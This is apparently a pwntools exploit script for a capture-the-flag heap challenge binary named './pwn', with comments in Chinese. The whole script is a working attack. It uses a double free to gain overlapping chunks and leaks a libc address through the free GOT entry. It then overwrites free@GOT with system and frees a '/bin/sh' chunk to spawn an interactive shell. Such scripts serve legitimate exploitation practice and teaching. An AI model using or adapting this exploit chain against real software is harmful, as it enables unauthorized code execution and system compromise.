#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug = 0
local = 1
#context.log_level='debug'
context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote()
    libc=ELF()
if debug:
    gdb.attach(a)
    # x/2gx 0x0000000004040D0
elf=ELF("./pwn")
def debug():
    gdb.attach(a,'''
    b *0x401576
    b *0x000000000401692
    b *0x4018BE
    b *0x401789
    ''')
def menu(idx):
    a.recvuntil("> ")
    a.sendline(str(idx))
def add(content):
    menu(1)
    a.recvuntil("Your data:\n")
    a.sendline(content)
def show(idx):
    menu(2)
    a.recvuntil("Info index: ")
    a.sendline(str(idx))
def edit(idx,content):
    menu(3)
    a.recvuntil("Info index: ")
    a.sendline(str(idx))
    pause()
    a.sendline(content)
def delete(idx):
    menu(4)
    a.recvuntil("Info index: ")
    a.sendline(str(idx))
#chunk的第一个8字节，前面是size，后面是index
#先free的content_chunk再free的chunk_info


add('A')#0
add('A')#1，chunk0和chunk1公用同一个content chunk。
delete(1)
delete(0)  #double free，chunk_info_0的content和chunk_info_1的content被free了两次
add("")  #0，获得chunk0的chunk_info和content，

add("/bin/sh\x00"+'A'*(0x67-8))#1，getshell用的，同时content的size不应该是32byte。
free_got=elf.got["free"]
add("\xff\xff\xff\xff"+'\x01'*4+'\x18\x40\x40')#2
show(-1)
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["free"]
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
success("one ==>0x%x"%system_addr)
debug()
edit(-1,p64(system_addr))
delete(1)
a.interactive()
